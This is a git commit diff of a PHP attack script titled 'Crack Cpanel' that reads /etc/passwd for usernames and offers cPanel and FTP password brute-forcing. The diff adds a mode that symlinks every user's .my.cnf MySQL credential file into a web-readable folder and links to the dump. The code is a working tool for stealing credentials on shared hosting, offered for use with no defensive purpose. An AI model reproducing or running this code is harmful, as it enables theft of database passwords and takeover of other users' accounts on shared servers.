eb017e4d419aff2532285a2edea039e070188b97
w0lgix <mhmad.msarwe@yahoo.com>
2016-12-11 19:34:51 +0200

    Add files via upload

--- cpanel.php
+++ cpanel.php
@@ -1,9 +1,16 @@
 <html>
-<head><title>Cpanel</title></head>
+<head>
+	
+<title>Cpanel</title>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+</head>
 
 <style> 
 body {
-    background: url("http://www.jumpy.co.il/admin/gallery/security_privacy_hacker_crime_thief_steal_data_information_digital_criminal_breach_binary_code_danger_safety_password-100411670-orig.jpg");
+    background: url("http://store1.up-00.com/2016-05/1463179098221.jpg");
     background-size: 1500px 1300px;
     background-repeat: no-repeat;
     padding-top: 40px;
@@ -18,7 +25,7 @@ body {
 
 error_reporting(0);
 
-echo "<center><center><h2><font color='blue' />Crack Cpanel V 0.7.1</h2></center></center>";
+echo "<center><center><h2><font color='blue' />Crack Cpanel V 0.7.3</h2></center></center>";
 $a = fopen("/etc/passwd","r");
 $read = fread($a, filesize("/etc/passwd"));
 fclose($a);
@@ -36,7 +43,7 @@ $case =  "
 <select name='way'>
 <option value='Cpanel'> Cpanel</option>
 <option value='FTP'> FTP</option>
-<option value='Soon!'> Soon!</option>
+<option value='My_Cnf'> My_Cnf</option>
 </select>
 </from></center></center>
 ";
@@ -85,8 +92,37 @@ echo "<hr><b>You Found <font color=red>$ok</font> FTP By w0lgix</b>\n";
 
 	break;
 
-	case "Soon!":
-echo "";
+case "My_Cnf":
+	
+$pass33 = fopen("/etc/passwd","r");
+$read4 = fread($pass33, filesize("/etc/passwd"));
+fclose($pass33);
+$username4 = preg_replace("/:\/*[a-zA-Z0-9,-]*(...)*[a-z]*/","", $read4);
+$username14 = explode("\n",$username4);
+
+foreach ($username14 as $key4) {
+	# code...
+
+		mkdir('cpanel');
+		$path = getcwd();
+		@symlink('/home/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
+		@symlink('/var/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
+		@symlink('/var/www/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
+		@symlink('/home1/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
+		@symlink('/home2/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
+		@symlink('/home3/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
+		@symlink('/home4/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
+		@symlink('/home5/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
+		@symlink('/home6/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
+		@symlink('/var/www/html/'.$key4.'/.my.cnf', $path.'/cpanel/'.$key4.'.txt');
+							
+	}	
+
+echo "<script>alert('Dumped!')</script>";
+
+$path2 = dirname($_SERVER['PHP_SELF']);
+$link = "<a href=$path2/cpanel target='_blank'><font color='red'>Link Here:~)</font></a>";
+echo $link;
 die();
 	break;
 
@@ -95,7 +131,7 @@ die();
 
 
 
-$pass = "S
+$pass = "
 <center><center>
 <form  method='post'  >
 <textarea rows=15 cols=70 size=88 name='password' >
@@ -142,10 +178,12 @@ echo "<hr><b>You Found <font color=red>$ok</font> Cpanel By w0lgix</b>\n";
 
 echo $brute;
 echo $pass;
-
+//#@345cc6mvw5FTDJx=B#Dfgt56
+//#1234S$%bdu+S+ERF-12#$@@tui#
 ?>
 
 </body>
 
 
 </html>
+
